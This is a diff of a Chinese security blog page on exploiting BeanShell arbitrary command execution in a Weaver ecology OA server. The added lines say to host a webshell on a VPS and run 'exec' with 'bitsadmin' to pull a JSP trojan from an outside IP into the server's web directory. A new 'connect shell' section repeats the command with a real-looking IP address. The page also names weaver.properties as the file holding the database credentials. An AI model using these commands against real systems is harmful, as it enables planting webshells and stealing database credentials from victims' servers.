@@ -15,8 +15,10 @@
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.png">
 <meta property="og:image" content="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/2.png">
+<meta property="og:image" content="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/3.png">
+<meta property="og:image" content="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/4.png">
 <meta property="article:published_time" content="2022-11-26T02:26:33.000Z">
-<meta property="article:modified_time" content="2022-12-08T02:41:59.812Z">
+<meta property="article:modified_time" content="2022-12-08T02:46:09.426Z">
 <meta property="article:author" content="Dhayser Li">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/1.png">
@@ -112,14 +114,16 @@
 </ol>
 <h2 id="写shell"><a href="#写shell" class="headerlink" title="写shell"></a>写shell</h2><p>现在我们已经知道了web的绝对路径，我们就可以尝试写入webshell，更方便我们利用该漏洞。你可以使用echo写入，也可以远程下载，我这里使用的是远程下载方法</p>
 <ol>
-<li>在实战过程中，你需要将webshell放置到云vps中，并且启动一个webserver，让受害者可以http形式访问到并且下载木马，输入以下指令到Script框中并执行。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;bitsadmin /rawreturn /transfer down http://9.9.9.9:9090/2.jsp d:\\weaver\\ecology\\login\\123.jsp&quot;</span>)</span><br><span class="line">![](https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/3.png)</span><br><span class="line"></span><br><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;bitsadmin /rawreturn /transfer down http://150.158.138.182:8000/2.jsp d:\\weaver\\ecology\\123.jsp&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-weaver&#x2F;ecology&#x2F;web-inf&#x2F;prop&#x2F;weaver.properties 数据库账号密码</li>
+<li>在实战过程中，你需要将webshell放置到云vps中，并且启动一个webserver，让受害者可以http形式访问到并且下载木马，输入以下指令到Script框中并执行。Output中没有报错证明指令执行成功。<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;bitsadmin /rawreturn /transfer down http://9.9.9.9:8000/2.jsp d:\\weaver\\ecology\\123.jsp&quot;</span>)</span><br></pre></td></tr></table></figure>
+<img src="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/3.png"></li>
 </ol>
+<h2 id="连shell"><a href="#连shell" class="headerlink" title="连shell"></a>连shell</h2><p><img src="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/4.png"><br>exec(“bitsadmin &#x2F;rawreturn &#x2F;transfer down <a target="_blank" rel="noopener" href="http://150.158.138.182:8000/2.jsp">http://150.158.138.182:8000/2.jsp</a> d:\weaver\ecology\123.jsp”)</p>
+<p>&#96;&#96;&#96;<br>weaver&#x2F;ecology&#x2F;web-inf&#x2F;prop&#x2F;weaver.properties 数据库账号密码</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="clbeh4yjv0000djhffvpphl68" data-title="BeanShell任意命令执行" class="article-share-link">Share</a>
+      <a data-url="https://dhayser.github.io/2022/11/26/BeanShell%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="clbeh9fke0002fhhfa6sd827f" data-title="BeanShell任意命令执行" class="article-share-link">Share</a>
       
       
       
